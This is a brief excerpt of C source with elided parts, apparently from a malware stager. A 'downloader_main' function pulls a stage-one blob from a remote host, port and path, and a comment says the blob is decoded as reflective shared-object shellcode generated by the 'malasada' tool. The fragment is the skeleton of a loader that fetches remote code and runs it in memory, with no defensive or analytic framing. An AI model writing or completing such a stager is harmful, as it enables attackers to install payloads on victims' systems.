...
void downloader_main(void) {
  ...
  size_t downloaded_size =
      download_stage1_blob(host, port, path, stage_blob, MAX_STAGE_BLOB_SIZE);
  ...
  // Decode the full staged blob (reflective shared objective shellcode
  // generated by malasada).
